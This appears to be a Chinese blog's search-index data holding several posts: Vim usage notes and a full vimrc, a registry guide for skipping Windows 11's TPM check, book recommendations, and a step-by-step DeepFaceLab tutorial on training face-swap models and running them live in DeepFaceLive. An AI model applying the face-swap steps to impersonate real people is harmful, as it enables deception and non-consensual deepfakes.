匹配行尾,如here:$只会匹配出位于一行结尾的here:. ^ 匹配行首,如^Part只会匹配出位于一行开头的Part. \\\u003c \\\u003e 会匹配出以某些字符开头的(\\\u003c)或结尾(\\\u003e)的单词.\\\u003cac只会匹配出以ac开头的单词,如action,而ac\u003e/只会匹配出以ac结尾的单词,如maniac.\\\u003caction\\\u003e会匹配出action这个单词.单词的开头和结尾,是用标点符号或空格来分隔的. ","date":"2021-12-19","objectID":"/zh-cn/21/:4:5","tags":["编辑器","Vim"],"title":"vim的笔记","uri":"/zh-cn/21/"},{"categories":["编辑器","Vim"],"content":"贪婪匹配 默认使用贪婪匹配 可以使用”-“关闭 | 个数|贪婪模式|非贪婪模式| |–|–|–| |大于等于0个 | {}，相当于 * | 非贪婪模式{-}，把0省略了| |大于等于1个 | {1,}， 相当于 + |非贪婪模式{-1,}| |0个或1个， | {0,1}，相当于 = | 非贪婪模式{-,1}| ","date":"2021-12-19","objectID":"/zh-cn/21/:4:6","tags":["编辑器","Vim"],"title":"vim的笔记","uri":"/zh-cn/21/"},{"categories":["编辑器","Vim"],"content":"批量替换字符串 基本语法: :[addr]s/src/des/[option] ","date":"2021-12-19","objectID":"/zh-cn/21/:5:0","tags":["编辑器","Vim"],"title":"vim的笔记","uri":"/zh-cn/21/"},{"categories":["编辑器","Vim"],"content":"[addr] 命令 含义 1,20 1到20行 1,$ 整个文件 % 整个文件 .,$ 当前行到文件结尾 ","date":"2021-12-19","objectID":"/zh-cn/21/:5:1","tags":["编辑器","Vim"],"title":"vim的笔记","uri":"/zh-cn/21/"},{"categories":["编辑器","Vim"],"content":"s: 表示替换操作 ","date":"2021-12-19","objectID":"/zh-cn/21/:5:2","tags":["编辑器","Vim"],"title":"vim的笔记","uri":"/zh-cn/21/"},{"categories":["编辑器","Vim"],"content":"[optin] 命令 含义 g 全局替换 i 忽略大小写 ","date":"2021-12-19","objectID":"/zh-cn/21/:5:3","tags":["编辑器","Vim"],"title":"vim的笔记","uri":"/zh-cn/21/"},{"categories":["编辑器","Vim"],"content":"特别注意 查找时\\n代表换行 替换时\\r代表换行 即 :%s/\\n/\\r/g 文件不变 ","date":"2021-12-19","objectID":"/zh-cn/21/:5:4","tags":["编辑器","Vim"],"title":"vim的笔记","uri":"/zh-cn/21/"},{"categories":["编辑器","Vim"],"content":"vim插件 vim最强大的地方之一在于高度可定制性 主要体现在两个方面 vim丰富的插件 vimrc的各类设置 其中vim插件可以通过以下命令安装 yay -S vim-plug 然后只需要在vimrc文件里的写入以下句子即可 call plug#begin() # 完整的GitHub仓库地址 Plug 'https://github.com/junegunn/vim-github-dashboard.git' # 简写形式，只写username/repo即可 Plug 'junegunn/fzf' call plug#end() 然后在命令模式下输入 :PlugInstall 即可安装 此外还有插件更新操作 :PlugUpdate ","date":"2021-12-19","objectID":"/zh-cn/21/:6:0","tags":["编辑器","Vim"],"title":"vim的笔记","uri":"/zh-cn/21/"},{"categories":["编辑器","Vim"],"content":"vimrc 这是一个可以规定vim操作的文件 类似于vim的设置 以下是我的vimrc(已添加注释) \"vim的设置 \" __ __ ___ __ __ ____ ____ \" \\ \\ / / |_ _| | \\/ | | _ \\ / ___| \" \\ \\ / / | | | |\\/| | | |_) | | | \" \\ V / | | | | | | | _ \u003c | |___ \" \\_/ |___| |_| |_| |_| \\_\\ \\____| \"显示模式 set showmode \"共享剪贴板 set clipboard=unnamedplus \"自动语法高亮 set syntax=on \"高亮显示匹配的括号([{和}])\" set showmatch \"高亮搜索 set hlsearch \"输入的命令显示出来\" set showcmd \"显示颜色 set t_Co=256 \"打开鼠标 set mouse=a \"显示相对行号 set relativenumber \"命令模式下允许自动补全命令 set wildmenu \"高亮当前行 set cursorline \"实时匹配 set incsearch \"搜索时忽略大小写 set ignorecase \"智能大小写(输入大写时就对大小写敏感,否则不敏感) set smartcase \"自动切换到当前文件的目录 set autochdir \"光标移动到buffer的顶部底部保持3行 set scrolloff=3 \"检测文件类型 filetype on \"显示行号 set number \"自动缩进 set smartindent \"自动缩进的空格数 set shiftwidth=4 \"tab的空格数 set tabstop=4 \"按下tab自动转化为空格 set expandtab \"tab被转化为共个的数目 set softtabstop=4 \"vim的编码方式 set fileencodings=utf-8,gbk \"折叠方式 set foldmethod=manual \"更新时间 set updatetime=10 \"plug插件管理设置 call plug#begin('~/.vim/plugged') Plug 'mhinz/vim-startify' Plug 'scrooloose/nerdtree', { 'on': 'NERDTreeToggle' } Plug 'Xuyuanp/nerdtree-git-plugin' Plug 'Valloric/YouCompleteMe' Plug 'tpope/vim-surround' Plug 'iamcco/markdown-preview.nvim', { 'do': { -\u003e mkdp#util#install() }, 'for': ['markdown', 'vim-plug']} Plug 'godlygeek/tabular' Plug 'plasticboy/vim-markdown' call plug#end() \"自定义的快捷键 map S :w\u003cCR\u003e map D :q\u003cCR\u003e map Q :q!\u003cCR\u003e map sr : set splitright\u003cCR\u003e:vsplit\u003cCR\u003e map sn : set nosplitright\u003cCR\u003e:vsplit\u003cCR\u003e map sb : set splitblow\u003cCR\u003e:vsplit\u003cCR\u003e map tt : NERDTreeToggle\u003cCR\u003e cmap w!! w !sudo tee \u003e /dev/null % \" markdown-preview's config \"--------------start------------- \" set to 1, nvim will open the preview window after entering the markdown buffer let g:mkdp_auto_start = 1 \" set to 1, the nvim will auto close current preview window when change let g:mkdp_auto_close = 1 \" set to 1, the vim will refresh markdown when save the buffer or let g:mkdp_refresh_slow = 1 \" set to 1, the MarkdownPreview command can be use for all files, let g:mkdp_command_for_global = 0 \" set to 1, preview server available to others in your network let g:mkdp_open_to_the_world = 0 \" use custom IP to open preview page let g:mkdp_open_ip = '127.0.0.1' \" specify browser to open preview page \" let g:mkdp_browser = 'chromium' let g:mkdp_browser = 'google-chrome-stable' let g:mkdp_preview_options = { \\ 'mkit': {}, \\ 'katex': {}, \\ 'uml': {}, \\ 'maid': {}, \\ 'disable_sync_scroll': 0, \\ 'sync_scroll_type': 'middle', \\ 'hide_yaml_meta': 1, \\ 'sequence_diagrams': {}, \\ 'flowchart_diagrams': {}, \\ 'content_editable': v:false, \\ 'disable_filename': 0 \\ } \" use a custom port to start server or random for empty let g:mkdp_port = '8080' \" preview page title let g:mkdp_page_title = '「${name}」' \" recognized filetypes let g:mkdp_filetypes = ['markdown'] let g:mkdp_path_to_chrome = '/usr/bin/chromium' \" Whether to enable synchronization let g:mkdp_preview_options.disable_sync_scroll = 0 \"--------------end------------- \" youcompeleteme'setting \"--------------start------------- \"let g:ycm_global_ycm_extra_conf = \"~/.vim/.ycm_extra_conf.py\" \"2个字符后开始补全 let g:ycm_min_num_identifier_candidate_chars = 2 \"tab键不弹出函数定义 set completeopt=menu,menuone let g:ycm_add_preview_to_completeopt = 0 set completeopt-=preview let g:ycm_auto_hover='' \"补全列表的颜色(灰色) highlight PMenu ctermbg=242 ctermfg=0 guifg=black guibg=darkgrey highlight PMenuSel ctermfg=242 ctermbg=8 guifg=darkgrey guibg=black \"--------------end------------- \"##### auto fcitx ########### \"--------------start------------- let g:input_toggle = 1 function! Fcitx2en() let s:input_status = system(\"fcitx-remote\") if s:input_status == 2 let g:input_toggle = 1 let l:a = system(\"fcitx-remote -c\") endif endfunction function! Fcitx2zh() let s:input_status = system(\"fcitx-remote\") if s:input_status != 2 \u0026\u0026 g:input_toggle == 1 let l:a = system(\"fcitx-remote -o\") let g:input_toggle = 0 endif endfunction set ttimeoutlen=150 \"退出插入模式 autocmd InsertLeave * call Fcitx2en() \"进入插入模式 \"--------------end------------- \" vim-markdown \" 禁用折叠 let g:vim_markdown_fo","date":"2021-12-19","objectID":"/zh-cn/21/:7:0","tags":["编辑器","Vim"],"title":"vim的笔记","uri":"/zh-cn/21/"},{"categories":["编辑器","Vim"],"content":"vim插件 ","date":"2021-12-19","objectID":"/zh-cn/21/:8:0","tags":["编辑器","Vim"],"title":"vim的笔记","uri":"/zh-cn/21/"},{"categories":["编辑器","Vim"],"content":"vim-surround 主要用于操作成对的符号,例如(), [], {}, \u003c\u003e, ‘’, “”这类符号 主要命令如下 命令 含义 ds 删除一个配对符号 (delete a surrounding) cs 更改一个配对符号 (change a surrounding) ys 增加一个配对符号 (yank a surrounding) yS 在新的行增加一个配对符号并进行缩进 yss 在整行增加一个配对符号 ySs/Yss 在整行增加一个配对符号，配对符号单独成行并进行缩进 ","date":"2021-12-19","objectID":"/zh-cn/21/:8:1","tags":["编辑器","Vim"],"title":"vim的笔记","uri":"/zh-cn/21/"},{"categories":["编辑器","Vim"],"content":"ale vim下的自动查错工具,在写某些需要编译的语言很好用 优势如下: **实时检测。**为了让代码可以在编辑时进行实时的检测，ale 的运行方式是将代码做为 stdin 导入检测工具（不支持的话使用临时文件），这样做的好处是我们可以更早的发现错误。 **并发运行。**ale 默认使用所有可用的检测工具并发执行检测，譬如说我们有时需要同时对 javascript 运行 eslint 以及 jscs。 标识栏、状态栏以及命令行消息支持。 ","date":"2021-12-19","objectID":"/zh-cn/21/:8:2","tags":["编辑器","Vim"],"title":"vim的笔记","uri":"/zh-cn/21/"},{"categories":["编辑器","Vim"],"content":"nerdtree vim下的树形浏览文件工具 使用tt命令打开,效果如下 ","date":"2021-12-19","objectID":"/zh-cn/21/:8:3","tags":["编辑器","Vim"],"title":"vim的笔记","uri":"/zh-cn/21/"},{"categories":["编辑器","Vim"],"content":"YouCompleteMe 自动补全工具,功能强大,支持各类语言 在vimrc中安装后并不能使用 还需要按照如下步骤: 进入ycm目录 cd ~/.vim/plugged/YouCompleteMe 给予可执行权限(任选其一) chmod +x install.py chmod +x install.sh 安装(任选其一) sudo python install.py sudo bash install.sh ","date":"2021-12-19","objectID":"/zh-cn/21/:8:4","tags":["编辑器","Vim"],"title":"vim的笔记","uri":"/zh-cn/21/"},{"categories":["编辑器","Vim"],"content":"markdown-preview.nvim 可以通过浏览器实时预览md文件,具有极高的自定义功能 手机扫一扫 jQuery('#qrcode').qrcode({ width: 96, height: 96, colorDark : \"#000000\", colorLight : \"#ffffff\", text: window.location.href });$(\"#save\").click(function () { var canvas = $('#qrcode').find(\"canvas\").get(0); var url = canvas.toDataURL('image/jpeg');$(\"#download\").attr('href', url).get(0).click(); return false; }); ","date":"2021-12-19","objectID":"/zh-cn/21/:8:5","tags":["编辑器","Vim"],"title":"vim的笔记","uri":"/zh-cn/21/"},{"categories":["Windows","TPM"],"content":" $(document).ready(function() {$(\"#begin_speak\").click(function () { let content = $(\"#text\").text(); let msg = new SpeechSynthesisUtterance(content); window.speechSynthesis.speak(msg);$(\"#pause_speak\").show();$(\"#cancel_speak\").show();});$(\"#cancel_speak\").click(function () { window.speechSynthesis.cancel();$(\"#pause_speak\").hide();$(\"#resume_speak\").hide();$(this).hide(); });$(\"#pause_speak\").click(function () { window.speechSynthesis.pause();$(\"#resume_speak\").show(); });$(\"#resume_speak\").click(function () { window.speechSynthesis.resume();$(this).hide(); }); }); # Win11安装跳过TPM的方法 微软新一代操作系统Windows11已经公布了，目前Win11预览版也已经向公众推送，新的操作系统在带来全新的界面和更多功能升级的同时，对于硬件的要求也有一定的提升，其中最令大家困扰的就是新系统需要支持TPM2.0的问题，下面就为大家带来Win11安装跳过TPM的详细教程吧。 　虽然微软一直都在强调 TPM 2.0 芯片是 Windows 11 的最基础需求，但事实证明，各大 PC 厂商依然有很大的自主权，甚至可以灵活地决定其 Win11 电脑是否出厂配备 TPM 模块。 　从目前的情况来看，即使电脑不支持 TPM 2.0 也是可以安装使用 Windows 11 的。本文给大家总结目前已知的绕过 TPM 2.0 方法。 　方法一、替换 appraiserres.dll 文件 　找到 Win10 ISO 的 sources 文件夹下的appraiserres.dll 文件，替换 Win11 ISO 同位置的同名文件。（文件我已经单独提取出来了，放在 Win11 的镜像下载链接里，后台回复“win11”即可获取。） 　完成后，需要使用第三方工具（如 Rufus或 AnyBurn）重新创建 ISO 镜像，然后再次运行安装文件。或者先制作启动盘后再替换也可以。 　二、修改注册表 　1、如果是直接运行 Setup.exe 来直接更新到 Windows 11 系统，可以修改当前系统的注册表，来屏蔽 “The PC must support TPM 2.0” 提示。 　快捷键 Win+R，输入 regedit，然后定位到如下的位置： 　HKEY_LOCAL_MACHINE\\SYSTEM\\Setup 　接着新建 LabConfig 的项，在 LabConfig 下创建两个 DWORD 值： 　BypassTPMCheck，值：00000001 　BypassSecureBootCheck，值：00000001 　2、如果是从U盘或其它介质启动，在进行镜像安装时，Win11 会提示“该电脑无法运行 Win11”。 　不要慌，在这个界面按 Shift+F10，打开命令行界面，输入 regedit 打开注册表，后面的操作和上面相同，也是定位到同样的注册表位置： 　HKEY_LOCAL_MACHINE\\SYSTEM\\Setup 　创建一个名为“LabConfig”的项，接着在“LabConfig”下创建两个 DWORD 值： 　键为“BypassTPMCheck”，值为“00000001” 　键为“BypassSecureBootCheck”，值为“00000001” 　保存退出后，上图的提示就消失了，大家就可以正常安装 Win11。 　方法三、强制升级（开启安全启动） 　升级之前你需要使用 UEFI + GPT 的方式安装系统（基本上预装 Win8、Win10 的电脑都是这种方式），在 BIOS 里打开安全启动（Secure Boot），即可用 ISO 文件直接升级。 　附：强制开启DEV通道的方法 　没有达到 Windows 11 的硬件要求，可能无法顺利加入 Insider 计划，也就是无法获得 Windows 11 测试版的推送。下面给大家提供修改注册表的方式，强制加入 DEV 通道，这样也能获得推送了。 　快捷键 Win+R，输入 regedit，然后定位到如下的位置： 　HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\WindowsSelfHost\\UI\\Selection 　把 UIBranch 的值更改为 Dev 　把 ContentType 的值更改为 Mainline 　把 Ring 的文本更改为 External 　接着注册表定位到如下的位置： 　HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\WindowsSelfHost\\Applicability 　把 BranchName 的值更改为 Dev 　把 ContentType 的值更改为 Mainline 　把 Ring 的值更改为 External 　注册表修改好后，重启系统然后进入设置应用 - 系统更新，点击左侧的 Windows Insider 选项检查所处通道，显示为 Dev 就是成功了。 　最后再为大家介绍一种最简单直接的安装方法，使用PE安装Win11 ISO镜像，因为PE安装时直接会读取win11系统iso镜像，这样就可以直接跳过TPM2.0的检测了。 手机扫一扫 jQuery('#qrcode').qrcode({ width: 96, height: 96, colorDark : \"#000000\", colorLight : \"#ffffff\", text: window.location.href });$(\"#save\").click(function () { var canvas = $('#qrcode').find(\"canvas\").get(0); var url = canvas.toDataURL('image/jpeg');$(\"#download\").attr('href', url).get(0).click(); return false; }); ","date":"2021-12-19","objectID":"/zh-cn/20/:0:0","tags":["Windows","TPM"],"title":"Win11安装跳过TPM的方法","uri":"/zh-cn/20/"},{"categories":["AI"],"content":" $(document).ready(function() {$(\"#begin_speak\").click(function () { let content = $(\"#text\").text(); let msg = new SpeechSynthesisUtterance(content); window.speechSynthesis.speak(msg);$(\"#pause_speak\").show();$(\"#cancel_speak\").show();});$(\"#cancel_speak\").click(function () { window.speechSynthesis.cancel();$(\"#pause_speak\").hide();$(\"#resume_speak\").hide();$(this).hide(); });$(\"#pause_speak\").click(function () { window.speechSynthesis.pause();$(\"#resume_speak\").show(); });$(\"#resume_speak\").click(function () { window.speechSynthesis.resume();$(this).hide(); }); }); # DeepFaceLab3：AMP模型的训练和应用 今天直入主题，主要讲一讲如何训练AMP模型以及如何应用到DeepFaceLive之中。 ","date":"2021-12-19","objectID":"/zh-cn/19/:0:0","tags":["AI"],"title":"DeepFaceLab3：AMP模型的训练和应用","uri":"/zh-cn/19/"},{"categories":["AI"],"content":"模型的训练 训练主要可以分两种方式：常规训练和复用训练 ","date":"2021-12-19","objectID":"/zh-cn/19/:1:0","tags":["AI"],"title":"DeepFaceLab3：AMP模型的训练和应用","uri":"/zh-cn/19/"},{"categories":["AI"],"content":"常规训练 常规训练流程如下： 这个流程就是我们之前讲的常规流程，只是训练的模型换成了AMP，并且还少了一些步骤。因为最终我们将要应用到DeepFaceLive中，所以常规流程中的应用模型和合成视频就不需要了。 这种训练方式就单次应用来说会省很多时间。但是如果需要训练不同的对象，那么每次重新开始就会比较费时间。 所以从长期使用的角度来说，使用复用训练会更好。大量素材训练的复用模型合成效果也会比较好。 ","date":"2021-12-19","objectID":"/zh-cn/19/:1:1","tags":["AI"],"title":"DeepFaceLab3：AMP模型的训练和应用","uri":"/zh-cn/19/"},{"categories":["AI"],"content":"复用训练 复用训练流程如下： 这个流程的操作思路是先对大量人脸进行训练，然后再训练具体的人。为了实现这个操作需要如下步骤。 \\1. 将软件自带RTM WF faceset数据集放到源目录的aligned下面。 \\2. 点击“ 6) 训练AMP模型 源对源 train AMP SRC-SRC.bat ” 开始训练，训练个几百万次。 \\3. 删除模型文件夹中的_AMP_inter_dst.npy文件 \\4. 然后按执行上图中的2-8步骤。 注意和常规步骤相比，这里多了Xseg泛型和SRC-SRC的处理。应用Xseg泛型是为了使用默认的遮罩模型给src和dst应用遮罩，SRC-SRC是给模型打基础。 ","date":"2021-12-19","objectID":"/zh-cn/19/:1:2","tags":["AI"],"title":"DeepFaceLab3：AMP模型的训练和应用","uri":"/zh-cn/19/"},{"categories":["AI"],"content":"模型的应用 训练的差不多了，就可以使用这个模型了。训练的环节主要由DeepFaceLab完成，而应用主要是在DeepFaceLive上。DeepFaceLive可以笼统的称为直播换脸软件，本质上这个软件只是实现了实时换脸的功能，真正直播推流还需要其他软件配合。所以说这个Live理解为实时比较合适。DeepFaceLive我们可以称之为实时换脸软件。 模型的应用可以分为两部分：导出和导入。 ","date":"2021-12-19","objectID":"/zh-cn/19/:2:0","tags":["AI"],"title":"DeepFaceLab3：AMP模型的训练和应用","uri":"/zh-cn/19/"},{"categories":["AI"],"content":"模型导出 导出的过程其实就做了tf2onnx的转换，具体操作是： \\1. 先点击 6) 导出AMP模型 export AMP as dfm.bat 批处理文件 \\2. 选择需要导出的模型，回车，回车，等待片刻。 \\3. 找到模型 成功导出的模型，放在model文件夹下面，后缀为.dfm 。 ","date":"2021-12-19","objectID":"/zh-cn/19/:2:1","tags":["AI"],"title":"DeepFaceLab3：AMP模型的训练和应用","uri":"/zh-cn/19/"},{"categories":["AI"],"content":"模型导入 导入模型也非常简，就是拷贝“amp_AMP_model.dfm” 文件到DeepFaceLive相应的文件夹即可。 具体路径为：DeepFaceLive\\userdata\\dfm_models 模型导入成功之后就可以启用实时换脸软件了 软件启动，稍作设置就是这个样子了。 这是使用软件自带的模型的效果，使用我们自己训练的模型，只需要修改Face Swapper 下面的Model即可。 DeepFaceLive已经是高度集成的可视化软件了，操作基本没啥难度，所以功夫主要还是在DeepFaceLab这一边。 下一篇介绍一下DeepFaceLive的具体操作。 文中提到的复用模型，我的素材和遮罩已经优化完了，训练到200万后会放到tonyhub中，因为素材比较多200万只是起步，我会继续练，继续更新。大家也可以自己在公共素材的基础上去优化，然后慢慢训练。 DeepFaceLab3系列 DeepFaceLab3：软硬件以及系统要求 DeepFaceLab3：工作目录和基本概念 DeepFaceLab3：视频换脸完整流程详解！ DeepFaceLab3：模型的异同，选择，基础操作！ 手机扫一扫 jQuery('#qrcode').qrcode({ width: 96, height: 96, colorDark : \"#000000\", colorLight : \"#ffffff\", text: window.location.href });$(\"#save\").click(function () { var canvas = $('#qrcode').find(\"canvas\").get(0); var url = canvas.toDataURL('image/jpeg');$(\"#download\").attr('href', url).get(0).click(); return false; }); ","date":"2021-12-19","objectID":"/zh-cn/19/:2:2","tags":["AI"],"title":"DeepFaceLab3：AMP模型的训练和应用","uri":"/zh-cn/19/"},{"categories":["书籍"],"content":" $(document).ready(function() {$(\"#begin_speak\").click(function () { let content = $(\"#text\").text(); let msg = new SpeechSynthesisUtterance(content); window.speechSynthesis.speak(msg);$(\"#pause_speak\").show();$(\"#cancel_speak\").show();});$(\"#cancel_speak\").click(function () { window.speechSynthesis.cancel();$(\"#pause_speak\").hide();$(\"#resume_speak\").hide();$(this).hide(); });$(\"#pause_speak\").click(function () { window.speechSynthesis.pause();$(\"#resume_speak\").show(); });$(\"#resume_speak\").click(function () { window.speechSynthesis.resume();$(this).hide(); }); }); 2021 年度十大图书 大脑上瘾的植物、人工智能、城市与计算机的隐喻｜Deep Reading 翻开日历，2021 的「余额」只剩下 5%，截止到本期，2021 年「Deep Reading」共发布了 36 封会员邮件，推荐超过 200 篇深度长文，并将内容关注点延伸到最新出版的图书书以及播客音频领域。 接下来的几期「Deep Reading」，我会以「年度十大图书」与「年度二十一问」的形式回顾即将告别的 2021。 我从过去一年读过的 40 多本书整理出了「年度十大图书」，其中的一个「硬性要求」是挑选出版于 2021 年的新书，同时尽量在主题层面符合「Deep Reading」一贯的选题角度，即技术视角下的个体与社会进化。 必须再说明一点：这份榜单有着浓浓的主观性，它不具备任何所谓的权威性，在我个人有限的时间和视野里，我只看到了这些自己觉得有价值的图书，与图书所谓的「好」与「坏」，以及，是否值得阅读，没有任何关系。 ","date":"2021-12-18","objectID":"/zh-cn/18/:0:0","tags":["书籍"],"title":"【2021 年度十大图书】大脑上瘾的植物、人工智能、城市与计算机的隐喻｜Deep Reading","uri":"/zh-cn/18/"},{"categories":["书籍"],"content":"让大脑上瘾的植物们 我是重度咖啡消费者，每天的生活与工作都是从咖啡开始，如果在家，早上我会用 6 人份的意式摩卡壶煮一壶咖啡，并在午饭前喝完，这是我近三年养成的习惯。 但我还是不确定自己是否咖啡上瘾，除了喝咖啡带来的一丝丝快乐之外，我也很难说清楚咖啡因之于自己的价值，而在这本 This Is Your Mind on Plants（亚马逊 Kindle 商店），作者以三个对人类大脑产生刺激作用的植物为切入点，这三个植物分别是鸦片、咖啡因、麦司卡林，每一个部分，作者都将自己试用感受以及这些植物的历史故事整合其中，写得非常精彩。 在咖啡因的部分，作者提到，咖啡可以提升人们的注意力，从而增强人们的线性与抽象思维，但在能否提升创造力方面还存在争议；另一方面，咖啡的流行与 18 世纪欧洲开始的理性时代有着重要联系，因为提升的注意力有助于推理，极大满足了理性时代与启蒙运动时期人们的生理与心理需求，成为资本主义崛起的「完美药物」。 与此同时，咖啡因还在一定程度上帮助人们摆脱掉自然规律的约束，借助咖啡因、人造光以及 19 世纪中期出现的电灯，夜晚不再只是睡眠的时间，而成为「生产时间」，咖啡因又与两次工业革命建立起了联系。而当人类社会进入信息时代之后，互联网抹平了时间与空间的限制，咖啡因还在加速「制造」又一批新工人，他们不再有自然时间的限制，也不再受限于空间，咖啡因让这些工人可以随时随地开始工作。 这是咖啡因与人类亲密互动故事的一面，而在故事的另一面，人类睡眠的缺失则有很大一部分责任归结于大量摄入咖啡因，睡眠不足可能是导致老年痴呆、抑郁症、焦虑等症状的关键因素，书中一位专家这样说道：「睡得越短，你的寿命也越短」。 ","date":"2021-12-18","objectID":"/zh-cn/18/:0:1","tags":["书籍"],"title":"【2021 年度十大图书】大脑上瘾的植物、人工智能、城市与计算机的隐喻｜Deep Reading","uri":"/zh-cn/18/"},{"categories":["书籍"],"content":"现实世界的人工智能 这是我今年特别推荐的人工智能主题图书，Atlas of AI: Power, Politics and the Planetary Costs of Artificial Intelligence（亚马逊 Kindle 商店）构建了一个观察人工智能的新视角，就像副标题所言，作者把政治、经济甚至气候成本纳入到人工智能发展的分析框架里，你会看到人工智能技术高速发展的背后，还藏着巨大成本。 这本书的逻辑非常清晰，作者 Kate Crawford 以冷静的笔调戳穿了一系列人工智能技术突破带来的幻觉，当然这里并不是要否定技术进步，而是在强调两个被全球科技媒体有意无意忽略的事实：其一，人工智能不是万能药丸，技术的突破需要与产业相结合；其二，与过往技术一样，人工智能的各项技术，依然依托在政治、经济影响力之下，从而还在制造新的不平等。 ","date":"2021-12-18","objectID":"/zh-cn/18/:0:2","tags":["书籍"],"title":"【2021 年度十大图书】大脑上瘾的植物、人工智能、城市与计算机的隐喻｜Deep Reading","uri":"/zh-cn/18/"},{"categories":["书籍"],"content":"深度学习视角下的人工智能 近十年人工智能的火热，离不开深度学习领域的技术突破，从这个角度去看，不了解深度学习的发展历程，也就无法理解当下人工智能的本质。 这是我特别推荐 Cade Metz 这本 Genius Makers: The Mavericks Who Brought AI to Google, Facebook, and the World（亚马逊 Kindle 商店）的原因所在，他把焦点对准了「深度学习」这个中心点，将历史上重要人物、公司、事件纳入其中，像极了一层层的「神经网络」，那些权重高的「参数」——Frank Rosenblatt、Geoffrey Hinton、Demis Hassabis 等——定义了当下众多人工智能应用与趋势。 这本书的最后一个章节，作者进一步探讨了深度学习一系列落地应用的争议以及人类所处的位置，这既是深度学习从学术到工业落地的巨大跨越，也进一步凸显出人机关系的微妙，以 Duplex 为代表的 AI 语音助理是否应该提前告知人类自己是一个机器人？亚马逊大规模部署仓库机器人带来的是公司效率提升还是替代了更多人类工作？GANs 与 GPT-3 赋予计算机的图像/文本生成能力，是否在冲击人类的是非价值观？ 这些问题已经不再局限在技术层面，而是与社会经济、价值观等混搭在一起，一并构成了另一个庞大的「神经网络」，让我们静静等待这个「神经网络」的输出结果吧。 ","date":"2021-12-18","objectID":"/zh-cn/18/:0:3","tags":["书籍"],"title":"【2021 年度十大图书】大脑上瘾的植物、人工智能、城市与计算机的隐喻｜Deep Reading","uri":"/zh-cn/18/"},{"categories":["书籍"],"content":"移民、黑帮与二十世纪的美国历史 Killing the Mob: The Fight Against Organized Crime in America（亚马逊 Kindle 商店）是一本聚焦在二十世纪美国黑帮（黑手党）兴起与衰落（或者说转型）的非虚构作品，整本书的时间跨度从 1930 年代到 1980 年代，作者选取了几个时间点，包括大萧条、二战、肯尼迪竞选总统前后，将移民、有组织犯罪、美国乃至全球经济转型等议题纳入其中，构建起了另一个回顾二十世纪历史的新角度。 如果你还有足够的时间，下面这些电影，也是这本书的延伸资料： 电影《教父》三部曲：豆瓣链接，三部电影总时长近 550 分钟； 《美国往事》：首推 251 分钟的导演剪辑加长版，豆瓣链接； 下面三部是马丁·斯科塞斯的导演作品： 《纽约黑帮》：时长 167 分钟，展示的是 19 世纪纽约的黑帮火拼故事，豆瓣链接； 《好家伙》：146 分钟，豆瓣链接； 《爱尔兰人》：209 分钟的片子，展示了西西里黑帮的衰落，豆瓣链接； 在阅读与观看的过程里，在虚拟和现实的切换中，你或许能更明白一句话：现实永远比电影更精彩。 ","date":"2021-12-18","objectID":"/zh-cn/18/:0:4","tags":["书籍"],"title":"【2021 年度十大图书】大脑上瘾的植物、人工智能、城市与计算机的隐喻｜Deep Reading","uri":"/zh-cn/18/"},{"categories":["书籍"],"content":"城市是不是一台计算机 城市是人类最伟大的创造之一，自古至今，不同地区、不同民族的人们，都在探索改造、优化城市的可能性，在人类进入计算机时代，并且越来越依赖数据智能的当下，「城市即计算机」的隐喻已然成为主流，「智慧城市」、「城市大脑」等项目层出不穷，下图是一个艺术设计，你可以将其看作一个城市的俯瞰图，也可以把它当作计算设备的电路图。 而透过人类学教授 Shannon Mattern 的观察与思考，或许可以看到另一种可能：将城市看作一台计算机存在诸多不足，面对城市优化，我们应该具备新的智能。 这本 A City Is Not a Computer: Other Urban Intelligences（亚马逊 Kindle 商店）系统探讨了人类迷恋「城市即计算机」的起源，并展示了基于这样的假设所带来的种种局限性，这个隐喻从根本上否定了城市混乱、复杂的本性，而是借助「0 和 1」的绝对理性构建所谓的秩序，但带来的或许是更深层次的混乱。 大学教授的身份，使得作者更喜欢引经据典，并且会围绕某个议题几次来回论证，因此这本书读起来并不容易，但如果你对自己生活的城市不可避免地成为「计算机」感兴趣，那么一定去翻一下这本书。 ","date":"2021-12-18","objectID":"/zh-cn/18/:0:5","tags":["书籍"],"title":"【2021 年度十大图书】大脑上瘾的植物、人工智能、城市与计算机的隐喻｜Deep Reading","uri":"/zh-cn/18/"},{"categories":["书籍"],"content":"大宗贸易的地下江湖 这本 The World For Sale（亚马逊 Kindle 商店）也是今年英文主流媒体极力推荐的图书，它向读者展现了全球贸易的另一幅图景：大宗贸易。 从石油到各种主要农作物，一群低调的大宗贸易商构建起了庞大的商业帝国，他们可以突破国际制裁为某些国家提供所需的任何资源，也可以帮助地区强国控制其他国家的经济命脉，进而影响该国政治走向，这本书展现了自上世纪 50 年代之后全球政治、经济大变局之下的底层逻辑。 本书的两位作者是 Bloomberg 大宗贸易领域的资深记者，其丰富的线人资源为这本书提供了足够多的细节（包括中国 2008 年前后的粮食危机），同时记者的身份，也让本书的叙述方式更具可读性，以至于很多时候我不知道是在读真实的历史故事还是在读虚构的小说。 ","date":"2021-12-18","objectID":"/zh-cn/18/:0:6","tags":["书籍"],"title":"【2021 年度十大图书】大脑上瘾的植物、人工智能、城市与计算机的隐喻｜Deep Reading","uri":"/zh-cn/18/"},{"categories":["书籍"],"content":"作为「偏执狂」的贝佐斯 英特尔前 CEO 安迪·格鲁夫有一句名言：只有偏执狂才能生存（Only the Paranoid Survive）。这句话道出了企业，特别是科技企业的生存之道，而在 Bloomberg 资深记者 Brad Stone 今年的新书 Amazon Unbound（亚马逊 Kindle 商店）里，你会领略到亚马逊创始人贝佐斯到底有多偏执。 这是一本讲述 2010 年代亚马逊如何高速成长的故事，故事的主角当然是该公司创始人贝佐斯，透过这本书，你会看到他如何从一家电商公司老板踏入媒体领域（个人资产收购《华盛顿邮报》）、电影领域（通过 Amazon Studio 赢得好莱坞青睐），与此同时，他也成为美国东西海岸最有名望的人物，以及，这个星球上最有钱的几个人之一。 其中的一个细节，2019 年贝佐斯的私人生活出现一些变化，他被报道与一位已婚女性有染，接着贝佐斯宣布离婚，并通过公开渠道向八卦媒体「开战」，整个过程里，贝佐斯和他的团队牢牢掌握了舆论话语权，通过预设立场、话题引导、重复解读等手段，成功地维护了贝佐斯的个人形象以及亚马逊的股价，这几乎是教科书级别的 PR 行动。 